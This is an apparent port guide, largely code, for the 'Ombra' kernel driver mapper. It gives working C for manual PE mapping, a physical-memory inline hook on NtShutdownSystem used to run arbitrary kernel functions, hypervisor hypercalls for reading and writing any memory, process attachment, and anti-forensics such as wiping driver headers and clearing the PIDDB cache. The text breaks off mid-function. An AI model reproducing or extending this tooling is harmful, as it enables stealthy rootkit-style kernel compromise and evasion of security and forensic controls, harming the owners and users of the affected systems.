# KERNEL DRIVER MAPPER & MEMORY MANAGEMENT - C++ to C + Assembly Port Guide

## Overview

This document covers the most critical components for manual driver mapping: PE parsing, relocation processing, import resolution, physical memory operations, and the VDM (Vulnerable Driver Manipulation) pattern used to execute kernel code without registering in PsLoadedModuleList.

**Core Functionality:**
- Manual PE driver mapping (bypassing normal driver load paths)
- Physical memory identity mapping via hypervisor
- Kernel context acquisition via syscall hooking
- Driver header elimination (anti-forensics)
- PIDDB cache clearing

**Critical Insight:** This mapper uses identity mapping to find and hook `NtShutdownSystem` in physical memory, then uses that hook as a trampoline to execute arbitrary kernel functions. The hypervisor MUST be active before `kernel_ctx` initialization because identity mapping requires VMCALL primitives.

---

## File Inventory

### Driver Mapping Layer (`libombra/mapper/`)
```
map_driver.h/cpp        - Main driver mapping orchestration
drv_image.h/cpp         - PE image parsing, relocation, import fixing
kernel_ctx.h/cpp        - Kernel execution context via syscall hook
dbrequest.h             - Alternative allocation via DB channel
hook.hpp                - Inline hook detour implementation
nt.hpp                  - NT kernel type definitions
util.hpp                - Helper functions (module enumeration, export resolution)
```

### Hypervisor Interface (`libombra/`)
```
libombra.hpp/cpp        - VMCALL wrapper API
identity.hpp/cpp        - Physical memory identity mapping
vdm.hpp                 - High-level VDM class (OmbraVdm)
```

### Memory Management (`OmbraCoreLib/`)
```
VMMAllocator.h/cpp      - VMXRoot fixed-pool allocator (8MB pre-allocated)
MemoryEx.h/cpp          - Kernel memory utilities (pattern scan, process attach)
```

---

## Architecture Summary

### Dependency Chain (Runtime Injection)

```
OmbraLoader.exe (Ring 3)
    │
    ├─► ZeroHVCI::Initialize()
    │       └─► Kernel R/W primitives (PreviousMode manipulation)
    │
    ├─► RuntimeHijacker::HijackHyperV()
    │       └─► PayLoad.dll intercepts VMExits
    │
    └─► mapper::map_driver()
            │
            ├─► kernel_ctx::kernel_ctx()
            │       │
            │       └─► identity::phyToVirt()  ◄── REQUIRES HYPERVISOR!
            │               │
            │               └─► ombra::hypercall(VMCALL_VIRT_TO_PHY)
            │
            ├─► drv_image::fix_imports()
            ├─► drv_image::relocate()
            ├─► kernel_ctx::write_kernel()
            └─► kernel_ctx::syscall<DRIVER_INITIALIZE>()
```

**Key Constraint:** `identity::phyToVirt()` depends on the hypervisor being active because it uses `ombra::virt_to_phy()` which makes a VMCALL. This is why RuntimeHijacker must complete before map_driver() can work.

---

## PE Manual Mapping

### Complete Algorithm (from `drv_image` class)

```c
// Phase 1: Parse PE Headers
IMAGE_DOS_HEADER dos_hdr;
IMAGE_NT_HEADERS64 nt_hdr;
IMAGE_SECTION_HEADER* sections;

// Read DOS header
memcpy(&dos_hdr, driver_buffer, sizeof(dos_hdr));
if (dos_hdr.e_magic != 0x5A4D) return ERROR_INVALID_PE;

// Read NT headers
memcpy(&nt_hdr, driver_buffer + dos_hdr.e_lfanew, sizeof(nt_hdr));
if (nt_hdr.Signature != 0x4550) return ERROR_INVALID_PE;

// Get section array
sections = (IMAGE_SECTION_HEADER*)(
    (u8*)&nt_hdr.OptionalHeader + nt_hdr.FileHeader.SizeOfOptionalHeader
);

// Phase 2: Map Image (copy headers + sections)
u64 image_size = nt_hdr.OptionalHeader.SizeOfImage;
u8* mapped_image = malloc(image_size);
memset(mapped_image, 0, image_size);

// Copy headers
memcpy(mapped_image, driver_buffer, nt_hdr.OptionalHeader.SizeOfHeaders);

// Copy each section
for (u32 i = 0; i < nt_hdr.FileHeader.NumberOfSections; i++) {
    IMAGE_SECTION_HEADER* sect = &sections[i];

    u8* dest = mapped_image + sect->VirtualAddress;
    u8* src = driver_buffer + sect->PointerToRawData;

    memcpy(dest, src, sect->SizeOfRawData);
}

// Phase 3: Process Relocations (see below)
relocate_image(mapped_image, &nt_hdr, pool_base);

// Phase 4: Fix Imports (see below)
fix_imports(mapped_image, &nt_hdr, get_export_fn);

// Phase 5: Allocate Kernel Pool
void* pool_base = ExAllocatePool(NonPagedPool, image_size);

// Phase 6: Write to Kernel
write_kernel(pool_base, mapped_image, image_size);

// Phase 7: Call DriverEntry
u64 entry_point = (u64)pool_base + nt_hdr.OptionalHeader.AddressOfEntryPoint;
NTSTATUS status = syscall_DriverEntry(entry_point, pool_base, image_size);

// Phase 8: Header Elimination (if success)
if (NT_SUCCESS(status)) {
    wipe_driver_headers(pool_base, nt_hdr.OptionalHeader.SizeOfHeaders);
}
```

### PE Header Parsing (No Windows Structures)

```c
// Manual PE structure definitions (no winnt.h)
typedef struct {
    u16 e_magic;    // 0x5A4D ("MZ")
    // ... skip 58 bytes ...
    u32 e_lfanew;   // Offset to NT headers (at +0x3C)
} IMAGE_DOS_HEADER;

typedef struct {
    u32 Signature;              // "PE\0\0" (0x4550)
    u16 Machine;                // 0x8664 for x64
    u16 NumberOfSections;
    u32 TimeDateStamp;
    u32 PointerToSymbolTable;
    u32 NumberOfSymbols;
    u16 SizeOfOptionalHeader;
    u16 Characteristics;
} IMAGE_FILE_HEADER;

typedef struct {
    u16 Magic;                  // 0x020B for PE32+
    u8  MajorLinkerVersion;
    u8  MinorLinkerVersion;
    u32 SizeOfCode;
    u32 SizeOfInitializedData;
    u32 SizeOfUninitializedData;
    u32 AddressOfEntryPoint;    // RVA of entry point
    u32 BaseOfCode;
    u64 ImageBase;              // Preferred load address
    u32 SectionAlignment;
    u32 FileAlignment;
    // ... (many fields) ...
    u32 SizeOfImage;            // Total size when loaded
    u32 SizeOfHeaders;          // Size of DOS+NT+Section headers
    u32 CheckSum;
    u16 Subsystem;
    u16 DllCharacteristics;
    // ... (more fields) ...
    u32 NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[16];
} IMAGE_OPTIONAL_HEADER64;

typedef struct {
    u32 Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64;

typedef struct {
    u8  Name[8];                // ASCII section name
    u32 VirtualSize;            // Size in memory
    u32 VirtualAddress;         // RVA when loaded
    u32 SizeOfRawData;          // Size in file
    u32 PointerToRawData;       // Offset in file
    u32 PointerToRelocations;
    u32 PointerToLinenumbers;
    u16 NumberOfRelocations;
    u16 NumberOfLinenumbers;
    u32 Characteristics;        // Section flags
} IMAGE_SECTION_HEADER;
```

### Section Mapping

```c
void map_sections(u8* driver_buffer, IMAGE_NT_HEADERS64* nt_hdr, u8* mapped_image) {
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)(
        (u8*)&nt_hdr->OptionalHeader + nt_hdr->FileHeader.SizeOfOptionalHeader
    );

    // Copy all sections from file to memory layout
    for (u32 i = 0; i < nt_hdr->FileHeader.NumberOfSections; i++) {
        IMAGE_SECTION_HEADER* sect = &sections[i];

        u8* target = mapped_image + sect->VirtualAddress;
        u8* source = driver_buffer + sect->PointerToRawData;

        // Copy raw data (SizeOfRawData may be < VirtualSize, rest is zeroed)
        memcpy(target, source, sect->SizeOfRawData);
    }
}
```

---

## Relocation Processing

### Base Relocation Algorithm

Relocations adjust hardcoded addresses when the image is loaded at a different base than `OptionalHeader.ImageBase`. The relocation directory contains blocks for each 4KB page that needs patching.

```c
typedef struct {
    u32 VirtualAddress;     // RVA of the page
    u32 SizeOfBlock;        // Size of this block (including header)
    u16 TypeOffset[...];    // Variable-length array of relocation entries
} IMAGE_BASE_RELOCATION;

// Each TypeOffset is:
//   Bits 0-11: Offset within the page (0-4095)
//   Bits 12-15: Relocation type
#define IMAGE_REL_BASED_ABSOLUTE    0   // Skip
#define IMAGE_REL_BASED_HIGH        1   // Add high 16 bits
#define IMAGE_REL_BASED_LOW         2   // Add low 16 bits
#define IMAGE_REL_BASED_HIGHLOW     3   // Add all 32 bits
#define IMAGE_REL_BASED_DIR64       10  // Add all 64 bits (x64 only)
```

### Complete Relocation Code

```c
bool process_relocations(u8* mapped_image, IMAGE_NT_HEADERS64* nt_hdr, void* new_base) {
    // Skip if no relocations
    if (nt_hdr->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED) {
        return true;
    }

    // Get relocation directory
    IMAGE_DATA_DIRECTORY* reloc_dir =
        &nt_hdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if (reloc_dir->VirtualAddress == 0 || reloc_dir->Size == 0) {
        return true;  // No relocations
    }

    IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(
        mapped_image + reloc_dir->VirtualAddress
    );

    // Calculate delta (new base - original base)
    u64 image_base_delta = (u64)new_base - nt_hdr->OptionalHeader.ImageBase;

    if (image_base_delta == 0) {
        return true;  // Loaded at preferred address
    }

    // Process all relocation blocks
    u8* reloc_end = (u8*)reloc + reloc_dir->Size;

    while ((u8*)reloc < reloc_end && reloc->VirtualAddress != 0) {
        // Get base address of this page
        u8* page_base = mapped_image + reloc->VirtualAddress;

        // Number of entries in this block
        u32 num_entries = (reloc->SizeOfBlock - 8) / 2;

        // Pointer to relocation entries
        u16* entries = (u16*)((u8*)reloc + 8);

        for (u32 i = 0; i < num_entries; i++) {
            u16 entry = entries[i];
            u16 type = (entry >> 12) & 0xF;
            u16 offset = entry & 0xFFF;

            u8* fixup_addr = page_base + offset;

            switch (type) {
                case IMAGE_REL_BASED_ABSOLUTE:
                    // Skip
                    break;

                case IMAGE_REL_BASED_HIGH:
                    *(u16*)fixup_addr += (u16)(image_base_delta >> 16);
                    break;

                case IMAGE_REL_BASED_LOW:
                    *(u16*)fixup_addr += (u16)(image_base_delta & 0xFFFF);
                    break;

                case IMAGE_REL_BASED_HIGHLOW:
                    *(u32*)fixup_addr += (u32)image_base_delta;
                    break;

                case IMAGE_REL_BASED_DIR64:
                    *(u64*)fixup_addr += image_base_delta;
                    break;

                default:
                    return false;  // Unknown type
            }
        }

        // Move to next block
        reloc = (IMAGE_BASE_RELOCATION*)((u8*)reloc + reloc->SizeOfBlock);
    }

    return true;
}
```

---

## Import Resolution

### Import Directory Structure

```c
typedef struct {
    u32 OriginalFirstThunk;     // RVA to Import Name Table (INT)
    u32 TimeDateStamp;
    u32 ForwarderChain;
    u32 Name;                   // RVA to DLL name string
    u32 FirstThunk;             // RVA to Import Address Table (IAT)
} IMAGE_IMPORT_DESCRIPTOR;

typedef struct {
    union {
        u64 ForwarderString;
        u64 Function;           // Address of imported function
        u64 Ordinal;
        u64 AddressOfData;      // RVA to IMAGE_IMPORT_BY_NAME
    } u1;
} IMAGE_THUNK_DATA64;

typedef struct {
    u16 Hint;                   // Export ordinal hint
    u8  Name[1];                // ASCII function name
} IMAGE_IMPORT_BY_NAME;

#define IMAGE_ORDINAL_FLAG64 0x8000000000000000ULL
```

### Manual Import Resolution Algorithm

```c
// Callback to resolve exports from kernel modules
typedef u64 (*get_export_fn)(const char* module_name, const char* function_name);

bool fix_imports(u8* mapped_image, IMAGE_NT_HEADERS64* nt_hdr, get_export_fn get_export) {
    IMAGE_DATA_DIRECTORY* import_dir =
        &nt_hdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    if (import_dir->VirtualAddress == 0 || import_dir->Size == 0) {
        return true;  // No imports
    }

    IMAGE_IMPORT_DESCRIPTOR* import_desc = (IMAGE_IMPORT_DESCRIPTOR*)(
        mapped_image + import_dir->VirtualAddress
    );

    // Process each imported module
    while (import_desc->Name != 0) {
        char* module_name = (char*)(mapped_image + import_desc->Name);

        // Get pointer to name table and address table
        IMAGE_THUNK_DATA64* name_table;
        if (import_desc->OriginalFirstThunk != 0) {
            name_table = (IMAGE_THUNK_DATA64*)(mapped_image + import_desc->OriginalFirstThunk);
        } else {
            name_table = (IMAGE_THUNK_DATA64*)(mapped_image + import_desc->FirstThunk);
        }

        IMAGE_THUNK_DATA64* addr_table = (IMAGE_THUNK_DATA64*)(
            mapped_image + import_desc->FirstThunk
        );

        // Process each imported function
        while (name_table->u1.AddressOfData != 0) {
            u64 function_addr = 0;

            // Check if import by ordinal
            if (name_table->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                u16 ordinal = (u16)(name_table->u1.Ordinal & 0xFFFF);
                // Ordinal imports not supported in kernel mode
                return false;
            } else {
                // Import by name
                IMAGE_IMPORT_BY_NAME* import_by_name = (IMAGE_IMPORT_BY_NAME*)(
                    mapped_image + (u32)name_table->u1.AddressOfData
                );

                char* function_name = (char*)import_by_name->Name;

                // Resolve export from target module
                function_addr = get_export(module_name, function_name);

                if (function_addr == 0) {
                    return false;  // Import resolution failed
                }
            }

            // Write resolved address to IAT
            addr_table->u1.Function = function_addr;

            name_table++;
            addr_table++;
        }

        import_desc++;
    }

    return true;
}
```

### Export Table Walking (for get_export callback)

```c
typedef struct {
    u32 Characteristics;
    u32 TimeDateStamp;
    u16 MajorVersion;
    u16 MinorVersion;
    u32 Name;                   // RVA to DLL name
    u32 Base;                   // Starting ordinal number
    u32 NumberOfFunctions;
    u32 NumberOfNames;
    u32 AddressOfFunctions;     // RVA to function address array
    u32 AddressOfNames;         // RVA to function name array
    u32 AddressOfNameOrdinals;  // RVA to ordinal array
} IMAGE_EXPORT_DIRECTORY;

u64 get_kernel_export(const char* module_name, const char* export_name) {
    // 1. Get kernel module base address (via NtQuerySystemInformation)
    u64 module_base = get_module_base(module_name);
    if (module_base == 0) return 0;

    // 2. Load module into usermode (via LoadLibraryEx with DONT_RESOLVE_DLL_REFERENCES)
    HMODULE h_module = LoadLibraryExA(module_path, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!h_module) return 0;

    // 3. Parse export directory
    IMAGE_DOS_HEADER* dos_hdr = (IMAGE_DOS_HEADER*)h_module;
    IMAGE_NT_HEADERS64* nt_hdr = (IMAGE_NT_HEADERS64*)((u8*)h_module + dos_hdr->e_lfanew);

    IMAGE_DATA_DIRECTORY* export_dir =
        &nt_hdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    IMAGE_EXPORT_DIRECTORY* export_table = (IMAGE_EXPORT_DIRECTORY*)(
        (u8*)h_module + export_dir->VirtualAddress
    );

    u32* addr_table = (u32*)((u8*)h_module + export_table->AddressOfFunctions);
    u32* name_table = (u32*)((u8*)h_module + export_table->AddressOfNames);
    u16* ordinal_table = (u16*)((u8*)h_module + export_table->AddressOfNameOrdinals);

    // 4. Search for export by name
    for (u32 i = 0; i < export_table->NumberOfNames; i++) {
        char* curr_name = (char*)((u8*)h_module + name_table[i]);

        if (strcmp(curr_name, export_name) == 0) {
            u16 ordinal = ordinal_table[i];
            u32 function_rva = addr_table[ordinal];

            // Check for forwarded export (RVA points inside export directory)
            if (function_rva >= export_dir->VirtualAddress &&
                function_rva < export_dir->VirtualAddress + export_dir->Size) {
                return 0;  // Forwarded exports not supported
            }

            // Return kernel virtual address
            return module_base + function_rva;
        }
    }

    return 0;  // Export not found
}
```

---

## Kernel Context (Syscall Hook Technique)

### Overview

The `kernel_ctx` class provides kernel code execution without a loaded driver by hooking a syscall in physical memory. This uses identity mapping to find and patch `NtShutdownSystem`.

**Key Steps:**
1. Load ntoskrnl.exe into usermode (via LoadLibraryEx)
2. Find RVA of target syscall (NtShutdownSystem)
3. Calculate page offset within 4KB page
4. Search physical memory for matching bytes
5. Verify hook works by calling it and checking result
6. Use hook as trampoline to call any kernel function

### Complete Implementation

```c
// Global state
u64 g_ntoskrnl_base = 0;            // Kernel ntoskrnl.exe base
u32 g_syscall_rva = 0;              // RVA of NtShutdownSystem
u16 g_page_offset = 0;              // Offset within page
u8* g_ntoskrnl_buffer = NULL;       // Usermode ntoskrnl.exe
void* g_syscall_mapped_page = NULL; // Physical page mapped via identity

bool kernel_ctx_init() {
    // 1. Get RVA of target syscall
    g_syscall_rva = (u32)get_kernel_export("ntoskrnl.exe", "NtShutdownSystem", true);
    if (g_syscall_rva == 0) return false;

    g_page_offset = g_syscall_rva % 0x1000;  // Offset within 4KB page

    // 2. Load ntoskrnl.exe into usermode
    g_ntoskrnl_buffer = (u8*)LoadLibraryExA(
        "C:\\Windows\\System32\\ntoskrnl.exe",
        NULL,
        DONT_RESOLVE_DLL_REFERENCES
    );
    if (!g_ntoskrnl_buffer) return false;

    // 3. Search physical memory for the syscall
    bool found = false;

    // Iterate physical memory ranges (from registry)
    for (auto range : pmem_ranges) {
        u64 phys_start = range.first;
        u64 phys_size = range.second;

        // Handle ranges >2MB (split into 2MB chunks)
        for (u64 offset = 0; offset < phys_size; offset += 0x200000) {
            u64 chunk_size = min(0x200000, phys_size - offset);

            // Map this chunk via identity mapping
            u64 phys_addr = phys_start + offset + g_page_offset;
            void* virt_addr = identity::phyToVirt(phys_addr);

            if (!virt_addr) continue;

            // Search each page in chunk
            for (u64 page_offset = 0; page_offset < chunk_size; page_offset += 0x1000) {
                void* page = (void*)((u64)virt_addr + page_offset);

                // Compare first 32 bytes of syscall
                if (memcmp(page, g_ntoskrnl_buffer + g_syscall_rva, 32) == 0) {
                    // Verify this is the real syscall by testing it
                    g_syscall_mapped_page = page;

                    u64 my_base = (u64)GetModuleHandleA(NULL);
                    u64 test_base = get_proc_base(GetCurrentProcessId());

                    if (my_base == test_base) {
                        found = true;
                        goto search_done;
                    }
                }
            }
        }
    }

search_done:
    if (!found) return false;

    return true;
}

// Execute arbitrary kernel function via syscall hook
template<typename T, typename... Args>
T kernel_syscall(void* kernel_func_addr, Args... args) {
    // Get usermode stub for syscall
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    void* stub = GetProcAddress(ntdll, "NtShutdownSystem");

    // Install hook (inline assembly)
    hook_install(g_syscall_mapped_page, kernel_func_addr);

    // Call syscall (redirects to kernel_func_addr)
    typedef T (*func_t)(Args...);
    T result = ((func_t)stub)(args...);

    // Remove hook
    hook_remove(g_syscall_mapped_page);

    return result;
}
```

### Inline Hook Implementation

```c
// x64 absolute jump shellcode:
// 48 B8 [8 bytes addr]   mov rax, addr
// FF E0                  jmp rax
u8 g_jmp_shellcode[12] = {
    0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,
    0xFF, 0xE0
};

u8 g_original_bytes[12];

void hook_install(void* hook_addr, void* jmp_to) {
    // Save original bytes
    memcpy(g_original_bytes, hook_addr, 12);

    // Write target address into shellcode
    *(u64*)(g_jmp_shellcode + 2) = (u64)jmp_to;

    // Write hook (page already RWX from identity mapping)
    memcpy(hook_addr, g_jmp_shellcode, 12);
}

void hook_remove(void* hook_addr) {
    // Restore original bytes
    memcpy(hook_addr, g_original_bytes, 12);
}
```

### Kernel Pool Allocation

```c
void* allocate_pool(u64 size, u32 pool_type) {
    // Get ExAllocatePool address
    static void* ex_alloc_pool = get_kernel_export("ntoskrnl.exe", "ExAllocatePool");

    // Call via syscall hook
    typedef void* (*ExAllocatePool_t)(u32, u64);
    return kernel_syscall<void*>(ex_alloc_pool, pool_type, size);
}

void* allocate_pool_with_tag(u64 size, u32 tag, u32 pool_type) {
    static void* ex_alloc_pool_tag = get_kernel_export("ntoskrnl.exe", "ExAllocatePoolWithTag");

    typedef void* (*ExAllocatePoolWithTag_t)(u32, u64, u32);
    return kernel_syscall<void*>(ex_alloc_pool_tag, pool_type, size, tag);
}
```

### Kernel Read/Write

```c
void write_kernel(void* dest, void* src, u64 size) {
    static void* rtl_copy_mem = get_kernel_export("ntoskrnl.exe", "RtlCopyMemory");

    typedef void* (*memcpy_t)(void*, void*, u64);
    kernel_syscall<void*>(rtl_copy_mem, dest, src, size);
}

void read_kernel(void* src, void* dest, u64 size) {
    static void* rtl_copy_mem = get_kernel_export("ntoskrnl.exe", "RtlCopyMemory");

    typedef void* (*memcpy_t)(void*, void*, u64);
    kernel_syscall<void*>(rtl_copy_mem, dest, src, size);
}
```

---

## VDM (Vulnerable Driver Manipulation)

### OmbraVdm Class

High-level wrapper around hypervisor primitives for usermode access to kernel memory.

```c
typedef struct {
    u64 callback_address;
    u64 ntoskrnl_address;
    u64 target_cr3;
} ombra_vdm;

void vdm_init(ombra_vdm* vdm, u64 callback_addr, u64 cr3) {
    vdm->callback_address = callback_addr;
    vdm->ntoskrnl_address = get_kernel_module_address("ntoskrnl.exe");
    vdm->target_cr3 = cr3;
}

bool vdm_read_memory(ombra_vdm* vdm, u64 src, void* dest, u64 size) {
    VMX_ROOT_ERROR status = ombra::read_virt(
        (u64)dest,
        src,
        size,
        vdm->target_cr3
    );
    return status == VMX_ROOT_ERROR::SUCCESS;
}

bool vdm_write_memory(ombra_vdm* vdm, u64 dest, void* src, u64 size) {
    VMX_ROOT_ERROR status = ombra::write_virt(
        dest,
        (u64)src,
        size,
        vdm->target_cr3
    );
    return status == VMX_ROOT_ERROR::SUCCESS;
}

// Get kernel export via reading kernel memory
u64 vdm_get_kernel_export(ombra_vdm* vdm, const char* function_name) {
    if (!vdm->ntoskrnl_address) return 0;

    // Read DOS header
    IMAGE_DOS_HEADER dos_hdr;
    if (!vdm_read_memory(vdm, vdm->ntoskrnl_address, &dos_hdr, sizeof(dos_hdr))) {
        return 0;
    }
    if (dos_hdr.e_magic != 0x5A4D) return 0;

    // Read NT headers
    IMAGE_NT_HEADERS64 nt_hdr;
    if (!vdm_read_memory(vdm, vdm->ntoskrnl_address + dos_hdr.e_lfanew, &nt_hdr, sizeof(nt_hdr))) {
        return 0;
    }
    if (nt_hdr.Signature != 0x4550) return 0;

    // Get export directory
    u32 export_rva = nt_hdr.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    u32 export_size = nt_hdr.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

    if (export_rva == 0 || export_size == 0) return 0;

    // Read export directory
    u8* export_data = malloc(export_size);
    if (!vdm_read_memory(vdm, vdm->ntoskrnl_address + export_rva, export_data, export_size)) {
        free(export_data);
        return 0;
    }

    IMAGE_EXPORT_DIRECTORY* export_dir = (IMAGE_EXPORT_DIRECTORY*)export_data;
    u64 delta = (u64)export_data - export_rva;

    u32* name_table = (u32*)(export_dir->AddressOfNames + delta);
    u16* ordinal_table = (u16*)(export_dir->AddressOfNameOrdinals + delta);
    u32* function_table = (u32*)(export_dir->AddressOfFunctions + delta);

    // Search for function
    for (u32 i = 0; i < export_dir->NumberOfNames; i++) {
        char* curr_name = (char*)(name_table[i] + delta);

        if (strcmp(curr_name, function_name) == 0) {
            u16 ordinal = ordinal_table[i];
            u32 function_rva = function_table[ordinal];

            if (function_rva <= 0x1000) {
                free(export_data);
                return 0;  // Invalid
            }

            u64 result = vdm->ntoskrnl_address + function_rva;
            free(export_data);
            return result;
        }
    }

    free(export_data);
    return 0;
}
```

---

## Physical Memory Operations

### Identity Mapping Initialization

Identity mapping creates a 1:1 virtual-to-physical mapping for the entire physical address space. This allows direct access to any physical address by adding a fixed offset.

**Mapping Strategy:**
- PML4 entry 0x10 (index 16) points to identity PDPT
- PDPT has 512 entries (covers 512GB)
- Each PD has 512 2MB pages (total 512 * 512 * 2MB = 512GB)

```c
typedef struct {
    u64 pml4[512];      // Aligned to 0x1000
    u64 pdpt[512];      // Aligned to 0x1000
    u64 pdt[512][512];  // Aligned to 0x1000 per table
} identity_mapping;

#define MAPPED_HOST_PHYS_PML 0x10  // PML4 index 16
#define IDENTITY_BASE (MAPPED_HOST_PHYS_PML << 39)  // 0x0000008000000000

bool identity_init(u64 guest_cr3) {
    // Allocate identity mapping structures
    identity_mapping* mapping = malloc_locked_aligned(
        sizeof(identity_mapping),
        0x1000
    );
    memset(mapping, 0, sizeof(identity_mapping));

    // Setup PML4 entry 0
    u64 pdpt_phys = ombra::virt_to_phy((u64)&mapping->pdpt[0]);
    mapping->pml4[0] = pdpt_phys | 0x7;  // P | RW | US

    // Setup 512 PDPT entries (512GB coverage)
    for (u64 i = 0; i < 512; i++) {
        u64 pd_phys = ombra::virt_to_phy((u64)&mapping->pdt[i][0]);
        mapping->pdpt[i] = pd_phys | 0x7;  // P | RW | US
    }

    // Setup 512*512 PD entries (2MB pages)
    for (u64 i = 0; i < 512; i++) {
        for (u64 j = 0; j < 512; j++) {
            u64 pfn = (i * 512) + j;  // Physical frame number
            mapping->pdt[i][j] = (pfn << 21) | 0x87;  // P | RW | PS | US
        }
    }

    // Read guest PML4
    u64 pml4[512];
    if (ombra::read_phys(guest_cr3, (u64)pml4, 0x1000) != VMX_ROOT_ERROR::SUCCESS) {
        return false;
    }

    // Install identity mapping at PML4[0x10]
    pml4[MAPPED_HOST_PHYS_PML] = mapping->pml4[0];

    // Write back modified PML4
    ombra::write_phys(guest_cr3, (u64)pml4, 0x1000);

    return true;
}

// Convert physical address to identity-mapped virtual address
u64 phy_to_virt(u64 phys_addr) {
    return IDENTITY_BASE + phys_addr;
}
```

### VA to PA Translation (via VMCALL)

```c
u64 virt_to_phy(u64 virt_addr, u64 dirbase) {
    COMMAND_DATA cmd = {0};
    cmd.translation.va = (void*)virt_addr;

    VMX_ROOT_ERROR status = ombra::hypercall(
        VMCALL_VIRT_TO_PHY,
        &cmd,
        dirbase,
        VMEXIT_KEY
    );

    if (status != VMX_ROOT_ERROR::SUCCESS) {
        return 0;
    }

    return cmd.translation.pa;
}
```

---

## VMXRoot Memory Allocator

### Fixed-Pool Allocator (8MB Pre-allocated)

The payload runs in VMXRoot context where kernel APIs are unavailable. A fixed 8MB pool is allocated once during initialization and parceled out via bump allocator.

```c
#define POOL_SIZE 0x800000  // 8MB

void* g_pool_base = NULL;
u64 g_pool_allocated = 0;

bool vmm_init_allocator() {
    // Allocate via kernel API (before entering VMXRoot)
    g_pool_base = ExAllocatePool(NonPagedPool, POOL_SIZE);
    if (!g_pool_base) return false;

    memset(g_pool_base, 0, POOL_SIZE);
    g_pool_allocated = 0;
    return true;
}

void* vmm_malloc(u64 size) {
    if (g_pool_allocated + size > POOL_SIZE) {
        return NULL;  // Out of memory
    }

    void* ptr = (void*)((u64)g_pool_base + g_pool_allocated);
    g_pool_allocated += size;
    return ptr;
}

void vmm_free(void* ptr) {
    // No-op (bump allocator doesn't support free)
}
```

**Limitation:** This is a bump allocator with no free() support. Memory is never reclaimed. For production use, implement a proper heap allocator (e.g., FreeList, Buddy System).

---

## MemoryEx Utilities

### Pattern Scanning

```c
bool check_mask(u8* base, u8* pattern, char* mask) {
    for (; *mask; base++, pattern++, mask++) {
        if (*mask == 'x' && *base != *pattern) {
            return false;
        }
    }
    return true;
}

void* find_pattern(u8* base, u64 length, u8* pattern, char* mask) {
    u64 mask_len = strlen(mask);
    length -= mask_len;

    for (u64 i = 0; i <= length; i++) {
        if (check_mask(base + i, pattern, mask)) {
            return base + i;
        }
    }

    return NULL;
}

void* find_pattern_in_section(void* image_base, const char* section_name, u8* pattern, char* mask) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)image_base;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)((u8*)image_base + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);

    for (u32 i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        IMAGE_SECTION_HEADER* sect = &sections[i];

        if (memcmp(sect->Name, section_name, strlen(section_name)) == 0) {
            u8* search_base = (u8*)image_base + sect->VirtualAddress;
            return find_pattern(search_base, sect->Misc.VirtualSize, pattern, mask);
        }
    }

    return NULL;
}
```

### Process Attachment

```c
typedef struct {
    u8 opaque[0x30];  // KAPC_STATE structure
} KAPC_STATE;

void* attach_to_process(u32 pid) {
    PEPROCESS process = NULL;

    // Get EPROCESS
    static void* ps_lookup = get_kernel_export("ntoskrnl.exe", "PsLookupProcessByProcessId");
    typedef NTSTATUS (*PsLookupProcessByProcessId_t)(HANDLE, PEPROCESS*);

    NTSTATUS status = kernel_syscall<NTSTATUS>(ps_lookup, (HANDLE)(u64)pid, &process);
    if (!NT_SUCCESS(status) || !process) {
        return NULL;
    }

    // Allocate KAPC_STATE
    KAPC_STATE* apc_state = (KAPC_STATE*)malloc(sizeof(KAPC_STATE));

    // Attach to process
    static void* ke_stack_attach = get_kernel_export("ntoskrnl.exe", "KeStackAttachProcess");
    typedef void (*KeStackAttachProcess_t)(PEPROCESS, KAPC_STATE*);

    kernel_syscall<void>(ke_stack_attach, process, apc_state);

    return apc_state;
}

void detach_from_process(void* apc_state) {
    static void* ke_unstack_detach = get_kernel_export("ntoskrnl.exe", "KeUnstackDetachProcess");
    typedef void (*KeUnstackDetachProcess_t)(KAPC_STATE*);

    kernel_syscall<void>(ke_unstack_detach, (KAPC_STATE*)apc_state);
    free(apc_state);
}
```

---

## libombra API (VMCALL Wrappers)

### Hypercall Interface

```c
// Assembly stub (com.asm)
// Triggers CPUID-based VMCALL with magic key
extern "C" VMX_ROOT_ERROR hypercall(u64 code, COMMAND_DATA* param1, u64 param2, u64 key);

// C wrapper
VMX_ROOT_ERROR ombra_hypercall(u64 code, void* data, u64 target_cr3) {
    return hypercall(code, (COMMAND_DATA*)data, target_cr3, VMEXIT_KEY);
}
```

### Physical Memory Operations

```c
VMX_ROOT_ERROR read_phys(u64 phys_addr, void* buffer, u64 size) {
    COMMAND_DATA cmd = {0};
    cmd.read.length = size;
    cmd.read.pOutBuf = buffer;
    cmd.read.pTarget = (void*)phys_addr;

    return ombra_hypercall(VMCALL_READ_PHY, &cmd, 0);
}

VMX_ROOT_ERROR write_phys(u64 phys_addr, void* buffer, u64 size) {
    COMMAND_DATA cmd = {0};
    cmd.write.length = size;
    cmd.write.pInBuf = buffer;
    cmd.write.pTarget = (void*)phys_addr;

    return ombra_hypercall(VMCALL_WRITE_PHY, &cmd, 0);
}
```

### Virtual Memory Operations

```c
VMX_ROOT_ERROR read_virt(u64 virt_addr, void* buffer, u64 size, u64 target_cr3) {
    COMMAND_DATA cmd = {0};
    cmd.read.length = size;
    cmd.read.pOutBuf = (void*)virt_addr;
